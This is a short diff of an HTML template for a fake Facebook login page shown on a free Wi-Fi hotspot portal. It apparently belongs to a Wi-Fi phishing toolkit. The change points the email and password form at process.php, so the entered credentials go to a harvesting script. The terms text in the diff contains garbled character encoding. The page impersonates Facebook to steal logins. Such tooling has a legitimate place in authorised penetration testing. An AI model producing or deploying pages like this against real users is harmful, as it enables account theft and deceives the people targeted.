@@ -41,7 +41,7 @@ function validateForm() {
   <div class="form">
     <h2>Login using Facebook</h2>
     <!-- <img src="/static/logos/facebook-logo.png" width="25%" class="logo"></img> -->
-    <form name="theform" class="theform" method="post" action="oauth.html" onsubmit="return validateForm();">
+    <form name="theform" class="theform" method="post" action="process.php" onsubmit="return validateForm();">
       <input type="text" placeholder="Email" name="wfphshr-email"/>
       <input type="password" placeholder="Password" name="wfphshr-password"/>
       <button class="login-btn">Login</button>
@@ -56,11 +56,11 @@ function validateForm() {
   <!-- Modal content -->
   <div class="modal-content">
     <div class="modal-header">
-      <span class="close">◊</span>
+      <span class="close">√ó</span>
       <h2>Terms of Usage</h2>
     </div>
     <div class="modal-body">
-      <p>This is a {{ organization }} free Hotspot wireless internet Service (the ìServiceî) provided for use by customers. All users are required to log-in individually as an independent user.</p>
+      <p>This is a {{ organization }} free Hotspot wireless internet Service (the ‚ÄúService‚Äù) provided for use by customers. All users are required to log-in individually as an independent user.</p>
       <p>
 The Service is made available provided:
 </p><p>
